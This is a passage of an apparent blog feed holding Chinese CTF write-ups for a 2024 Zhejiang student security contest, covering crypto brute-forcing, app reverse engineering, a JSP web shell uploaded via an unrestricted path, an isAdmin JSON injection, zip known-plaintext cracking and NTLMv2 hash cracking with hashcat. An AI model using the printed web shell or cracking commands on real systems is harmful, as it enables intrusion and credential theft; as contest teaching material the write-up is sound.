class="hljs-number">10</span></span>):<br>    length = <span class="hljs-built_in">len</span>(plaintext)<br>    padded_length = length <span class="hljs-keyword">if</span> length % <span class="hljs-number">4</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> length + (<span class="hljs-number">4</span> - (length % <span class="hljs-number">4</span>))<br>    plaintext += <span class="hljs-string">b&#x27;\x00&#x27;</span> * (padded_length - length)<br><br>    ciphertext = <span class="hljs-built_in">bytearray</span>(padded_length)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, padded_length, <span class="hljs-number">4</span>):<br>        state = <span class="hljs-built_in">list</span>(plaintext[i:i + <span class="hljs-number">4</span>])<br>        state = process_state(key, state, rounds, <span class="hljs-literal">True</span>)<br>        ciphertext[i:i + <span class="hljs-number">4</span>] = state<br><br>    <span class="hljs-keyword">return</span> ciphertext<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">ciphertext, key, rounds=<span class="hljs-number">10</span></span>):<br>    length = <span class="hljs-built_in">len</span>(ciphertext)<br>    plaintext = <span class="hljs-built_in">bytearray</span>(length)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, length, <span class="hljs-number">4</span>):<br>        state = <span class="hljs-built_in">list</span>(ciphertext[i:i + <span class="hljs-number">4</span>])<br>        state = process_state(key, state, rounds, <span class="hljs-literal">False</span>)<br>        plaintext[i:i + <span class="hljs-number">4</span>] = state<br><br>    <span class="hljs-keyword">return</span> plaintext.rstrip(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># plaintext = b&quot;DASCTF&#123;******&#125;&quot;</span><br>    <span class="hljs-comment"># key = 0xECB... # 4 bytes</span><br>    <span class="hljs-comment"># ciphertext = encrypt(plaintext, key)</span><br>    <span class="hljs-comment"># print(&quot;Ciphertext:&quot;, &#x27;&#x27;.join(f&quot;&#123;b:02X&#125;&quot; for b in ciphertext))</span><br><br>    Ciphertext = <span class="hljs-string">&#x27;A6B343D2C6BE1B268C3EA4744E3AA9914E29A0789F299022820299248C23D678442A902B4C24A8784A3EA401&#x27;</span><br>    Ciphertext = <span class="hljs-built_in">bytes</span>.fromhex(Ciphertext)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0xFFFFF</span> + <span class="hljs-number">1</span>):<br>        key = <span class="hljs-number">0xecb00000</span> + i<br>        re = decrypt(Ciphertext, key)<br>        <span class="hljs-built_in">print</span>(re)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;DAS&#x27;</span> <span class="hljs-keyword">in</span> re:<br>            <span class="hljs-keyword">break</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-zjss-js-MyCode-1.png"></p><h1 id="信创安全"><a href="#信创安全" class="headerlink" title="信创安全"></a>信创安全</h1><h2 id="OH"><a href="#OH" class="headerlink" title="OH"></a>OH</h2><p>app会在点击事件中对输入进行加密，将加密之后的数据与<code>/aPR+E8wS9+XbFMUfm8NacHpP190pf5xaR8+MIm/8gw=</code>进行比较</p><p><img src="/img/wp/2024/2024-zjss-js-OH-1.png"></p><p>程序加密的调用流程为<code>encrypt-&gt;encryptX-&gt;encryptY-&gt;encodeX-&gt;encodeY</code></p><p><img src="/img/wp/2024/2024-zjss-js-OH-2.png"></p><p><img src="/img/wp/2024/2024-zjss-js-OH-3.png"></p><p><img src="/img/wp/2024/2024-zjss-js-OH-4.png"></p><p>分析初始化函数发现，加密使用的密钥相同，为<code>DASCTF2024-OHAPP</code>，<code>encryptX</code>为aes-128|ecb加密，<code>encryptY</code>为aes-128|cbc加密</p><p>分析encryptY，发现疑似使用encryptX的结果作为cbc的iv<br>程序将明文从中间分为两个十六位字符串，前十六位进行encryptX加密，后十六位进行encryptY加密</p><p><img src="/img/wp/2024/2024-zjss-js-OH-5.png"></p><p><img src="/img/wp/2024/2024-zjss-js-OH-6.png"></p><p><img src="/img/wp/2024/2024-zjss-js-OH-7.png"></p><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><h2 id="网安知识大挑战-FINAL"><a href="#网安知识大挑战-FINAL" class="headerlink" title="网安知识大挑战-FINAL"></a>网安知识大挑战-FINAL</h2><p>简单的问题，直接做了</p><p><code>DBCCCCBCDB</code></p><p>根据提示用Triple DES解密得到flag</p><p><img src="/img/wp/2024/2024-zjss-js-%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E5%A4%A7%E6%8C%91%E6%88%98-FINAL-1.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;总榜Rank1，在毕业前拿到榜一也是圆满了 :)&lt;/p&gt;
&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;wucanrce&quot;&gt;&lt;a href=&quot;#wucanrce&quot;</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="2024竞赛" scheme="https://www.dr0n.top/tags/2024%E7%AB%9E%E8%B5%9B/"/>
    
    <category term="浙江" scheme="https://www.dr0n.top/tags/%E6%B5%99%E6%B1%9F/"/>
    
  </entry>
  
  <entry>
    <title>第七届浙江省大学生网络与信息安全竞赛预赛-WP</title>
    <link href="https://www.dr0n.top/posts/42d6129/"/>
    <id>https://www.dr0n.top/posts/42d6129/</id>
    <published>2024-11-02T09:00:00.000Z</published>
    <updated>2025-07-27T10:03:33.934Z</updated>
    
    <content type="html"><![CDATA[<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><h2 id="网安知识大挑战"><a href="#网安知识大挑战" class="headerlink" title="网安知识大挑战"></a>网安知识大挑战</h2><p>数据存储在js中</p><p><img src="/img/wp/2024/2024-zjss-cs-%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E5%A4%A7%E6%8C%91%E6%88%98-2.png"></p><p>aes解密得到flag</p><p><img src="/img/wp/2024/2024-zjss-cs-%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E5%A4%A7%E6%8C%91%E6%88%98-1.png"></p><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Base92 -&gt; Base85 -&gt; Base64 -&gt; Base62 -&gt; Base58 -&gt; Base45 -&gt; Base32<br></code></pre></td></tr></table></figure><p><code>DASCTF&#123;welcome_to_zjctf_2024&#125;</code></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="hack-memory"><a href="#hack-memory" class="headerlink" title="hack memory"></a>hack memory</h2><p>访问<code>/robot.txt</code>得到<code>/upload</code>路径</p><p>没有限制，直接上传一个小马</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*,java.io.*&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;%!<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">excuteCmd</span><span class="hljs-params">(String c)</span><br>&#123;<br>    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><span class="hljs-keyword">try</span><br>&#123;<br>    <span class="hljs-type">Process</span> <span class="hljs-variable">pro</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(c);<br>    <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(pro.getInputStream()));<br>    <span class="hljs-type">String</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">while</span> ((temp = buf.readLine()) != <span class="hljs-literal">null</span>)<br>    &#123;<br>        line.append(temp+<span class="hljs-string">&quot;\\n&quot;</span>);<br>    &#125;<br>    buf.close();<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception e)<br>&#123;<br>    line.append(e.getMessage());<br>&#125;<br><span class="hljs-keyword">return</span> line.toString();<br>&#125;<br>%&gt;<br>&lt;%<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;023&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>))&amp;&amp;!<span class="hljs-string">&quot;&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)))<br>&#123;<br>    out.println(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>+excuteCmd(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>))+<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    out.println(<span class="hljs-string">&quot;:-)&quot;</span>);<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>flag内容需要再base64一次</p><p><img src="/img/wp/2024/2024-zjss-cs-hack%20memory-1.png"></p><h2 id="easyjs"><a href="#easyjs" class="headerlink" title="easyjs"></a>easyjs</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> _ = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br><br><span class="hljs-comment">// 存储笔记的对象</span><br><span class="hljs-keyword">const</span> notes = &#123;&#125;;<br><br><span class="hljs-comment">// 创建新笔记</span><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/notes&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> noteId = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>    <span class="hljs-keyword">const</span> noteData = req.<span class="hljs-property">body</span>;<br><br>    <span class="hljs-keyword">if</span> (!noteId) &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Missing id&#x27;</span> &#125;);<br>    &#125;<br><br>    <span class="hljs-comment">// 使用lodash.merge，该版本存在原型链污染漏洞</span><br>    notes[noteId] = &#123;&#125;;<br>    _.<span class="hljs-title function_">merge</span>(notes[noteId], noteData);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Note prototype:&#x27;</span>, <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(notes[noteId]));<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Note properties:&#x27;</span>, notes[noteId]);<br>    res.<span class="hljs-title function_">json</span>(notes[noteId]);<br>&#125;);<br><br><span class="hljs-comment">// 获取笔记</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/notes/:id&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> noteId = req.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>;<br><br>    <span class="hljs-keyword">if</span> (!notes[noteId]) &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Note not found&#x27;</span> &#125;);<br>    &#125;<br><br>    res.<span class="hljs-title function_">json</span>(notes[noteId]);<br>&#125;);<br><br><span class="hljs-comment">// 获取flag (仅管理员可访问)</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/flag&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> noteId = req.<span class="hljs-property">headers</span>[<span class="hljs-string">&#x27;note-id&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (!noteId || !notes[noteId]) &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Authentication required&#x27;</span> &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!notes[noteId].<span class="hljs-property">isAdmin</span>) &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Admin access required&#x27;</span> &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> flag = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br>        res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">flag</span>: flag.<span class="hljs-title function_">trim</span>() &#125;);<br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Error reading flag&#x27;</span> &#125;);<br>    &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server running on port 8000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>先创建一个笔记，isAdmin设为true</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-zjss-cs-easyjs-1.png"></p><p>访问<code>/api/flag</code>的时候将note-id设为1即可得到flag</p><p><img src="/img/wp/2024/2024-zjss-cs-easyjs-2.png"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="RealSignin"><a href="#RealSignin" class="headerlink" title="RealSignin"></a>RealSignin</h2><p>图片尾数据<code>dEFfc1dGq1pxMgMWnihrMx9mewNgdvIWMvctrc</code></p><p>stegsolve 0通道得到base码表</p><p><code>ABCDEFGHIJKLMNabcdefghijklmnopqrstuvwxyzOPQRSTUVWXYZ0123456789+/</code></p><p>base64换表得到flag</p><p><img src="/img/wp/2024/2024-zjss-cs-RealSignin-1.png"></p><h2 id="机密文档"><a href="#机密文档" class="headerlink" title="机密文档"></a>机密文档</h2><p>简单爆破无果，尝试明文攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;the_secret_you_never_ever_know_hahahaha&quot;</span> &gt; plain.out<br>./bkcrack -C 1.zip -c the_secret_you_never_ever_know_hahahaha.zip -p plain.out -o 30 -x 0 504B030414000000<br><br>./bkcrack -C 1.zip -k b8edf1ff c1f93a7e f93d08e0 -U 2.zip dr0n1<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-zjss-cs-%E6%9C%BA%E5%AF%86%E6%96%87%E6%A1%A3-1.png"></p><p>解压后得到一个dom文件，其中有一个名为key的vba宏代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs vba">Sub key()<br>    Dim decValues As Variant<br>    Dim str As String<br>    Dim result As String<br>    Dim i As Integer<br>    Dim xorValue As Integer<br><br>    decValues = Array(26, 25, 28, 0, 16, 1, 74, 75, 45, 29, 19, 49, 61, 60, 3)<br>    str = &quot;outguess&quot;<br>    result = &quot;&quot;<br><br>    For i = LBound(decValues) To UBound(decValues)<br>        xorValue = decValues(i) Xor Asc(Mid(str, (i Mod Len(str)) + 1, 1))<br>        result = result &amp; Chr(xorValue)<br>    Next i<br><br>End Sub<br></code></pre></td></tr></table></figure><p>解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">26</span>, <span class="hljs-number">25</span>, <span class="hljs-number">28</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">1</span>, <span class="hljs-number">74</span>, <span class="hljs-number">75</span>, <span class="hljs-number">45</span>, <span class="hljs-number">29</span>, <span class="hljs-number">19</span>, <span class="hljs-number">49</span>, <span class="hljs-number">61</span>, <span class="hljs-number">60</span>, <span class="hljs-number">3</span>]<br>b=<span class="hljs-string">b&#x27;outguess&#x27;</span><br>d=[]<br><span class="hljs-keyword">for</span> i,k <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(a):<br>    d.append(b[i%<span class="hljs-built_in">len</span>(b)]^k)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(d))<br></code></pre></td></tr></table></figure><p>得到key: ulhged98BhgVHYp</p><p>根据vba中的<code>outguess</code>提示，对文件中的图片使用outguess解密后得到flag</p><p><code>outguess -k &#39;ulhged98BhgVHYp&#39; -r image1.jpg -t 1.txt</code></p><h2 id="EZtraffic"><a href="#EZtraffic" class="headerlink" title="EZtraffic"></a>EZtraffic</h2><p>导出SMB对象</p><p>导出的压缩包注释中得到<code>NTLM v2 plaintext + \d&#123;5&#125;</code></p><p>那么根据NTLM v2的格式拼接后爆破即可</p><p><code>username::domain:challenge:HMAC-MD5:blob</code></p><p>在流量包中对应的数据如下</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">User name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">rockyou</span><br><span class="hljs-attribute">Domain name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">MicrosoftAccount</span><br><span class="hljs-attribute">Server Challenge</span><span class="hljs-punctuation">:</span> <span class="hljs-string">4936df20962cae6d</span><br><span class="hljs-attribute">NTproofStr</span><span class="hljs-punctuation">:</span> <span class="hljs-string">db12ced50faf52f141636e80205e8f28</span><br><span class="hljs-attribute">NTLMv2 Response</span><span class="hljs-punctuation">:</span> <span class="hljs-string">01010000000000003604281b951fdb017b4045aa008508eb0000000002001e00440042004500440036004200350041002d0035003100430032002d00340001001e00440042004500440036004200350041002d0035003100430032002d00340004004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d0064006400320062003500370030006400350030003900360003004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d00640064003200620035003700300064003500300039003600070008003604281b951fdb01060004000200000008003000300000000000000001000000002000008029a5d8256e5c2762f439df5c06f3bc411fb0faeb3a6fa52d9273c57b09f2d10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e0031002e00380031000000000000000000</span><br><br>//HMAC-MD5对应数据包中的NTProofStr<br>//blob对应数据包中Response去掉NTProofStr的后半部分<br></code></pre></td></tr></table></figure><p><code>rockyou::MicrosoftAccount:4936df20962cae6d:db12ced50faf52f141636e80205e8f28:01010000000000003604281b951fdb017b4045aa008508eb0000000002001e00440042004500440036004200350041002d0035003100430032002d00340001001e00440042004500440036004200350041002d0035003100430032002d00340004004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d0064006400320062003500370030006400350030003900360003004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d00640064003200620035003700300064003500300039003600070008003604281b951fdb01060004000200000008003000300000000000000001000000002000008029a5d8256e5c2762f439df5c06f3bc411fb0faeb3a6fa52d9273c57b09f2d10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e0031002e00380031000000000000000000</code></p><p>使用<code>hashcat</code>爆破</p><p><code>hashcat -m 5600 1.txt rockyou.txt --show</code></p><p><img src="/img/wp/2024/2024-zjss-cs-EZtraffic-1.png"></p><p>掩码爆破得到<code>haticehatice12580</code></p><p>解压后是100张小图片，使用gaps的效果不好，猜测有地方存储了拼图顺序</p><p>发现每张图片的Red 0通道保存有一张二维码</p><p><img src="/img/wp/2024/2024-zjss-cs-EZtraffic-2.png"></p><p>写脚本排序并拼图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> zxing<br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_image_to_qrcode</span>(<span class="hljs-params">image_path</span>):<br>    <span class="hljs-comment"># 读取图片Red 0通道数据</span><br>    img = Image.<span class="hljs-built_in">open</span>(image_path)<br>    w, h = img.size<br>    rgb = [<span class="hljs-string">&#x27;&#x27;</span>]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>            data = img.getpixel((i, j))<br>            rgb[<span class="hljs-number">0</span>] += <span class="hljs-built_in">str</span>(data[<span class="hljs-number">0</span>] % <span class="hljs-number">2</span>)<br><br>    <span class="hljs-comment"># 转成二维码</span><br>    img = Image.new(<span class="hljs-string">&#x27;1&#x27;</span>, (w, h))<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>            img.putpixel((i, j), <span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">0</span>][j * w + i]))<br>    img.save(<span class="hljs-string">&#x27;./out/&#x27;</span> + image_path.split(<span class="hljs-string">&#x27;\\&#x27;</span>)[-<span class="hljs-number">1</span>])<br><br>    <span class="hljs-comment"># 扫描二维码</span><br>    reader = zxing.BarCodeReader()<br>    barcode = reader.decode(<span class="hljs-string">&#x27;./out/&#x27;</span> + image_path.split(<span class="hljs-string">&#x27;\\&#x27;</span>)[-<span class="hljs-number">1</span>])<br><br>    <span class="hljs-keyword">return</span> image_path, barcode.parsed<br><br><br>path = <span class="hljs-string">&quot;./final_out&quot;</span><br>names = []<br><span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(path):<br>    <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:<br>        names.append(os.path.join(root, file))<br><br>results = []<br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> names:<br>    results.append(process_image_to_qrcode(name))<br>    <span class="hljs-built_in">print</span>(results[-<span class="hljs-number">1</span>])<br><br><br><span class="hljs-comment"># 根据二维码内容排序，将图片合并 10*10</span><br>results.sort(key=<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">int</span>(x[<span class="hljs-number">1</span>]))<br><span class="hljs-built_in">print</span>(results)<br>width_i = <span class="hljs-number">50</span><br>height_i = <span class="hljs-number">50</span><br>line_max = <span class="hljs-number">10</span><br>row_max = <span class="hljs-number">10</span><br>pic_max = line_max * row_max<br>toImage = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (width_i * line_max, height_i * row_max))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(pic_max):<br>    pic_path = results[i][<span class="hljs-number">0</span>]<br>    pic_fole_head = Image.<span class="hljs-built_in">open</span>(pic_path)<br>    tmppic = pic_fole_head.resize((width_i, height_i))<br>    loc = (<span class="hljs-built_in">int</span>(i % line_max * width_i), <span class="hljs-built_in">int</span>(i // line_max * height_i))<br>    toImage.paste(tmppic, loc)<br>toImage.save(<span class="hljs-string">&#x27;merged.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-zjss-cs-EZtraffic-3.png"></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><figure 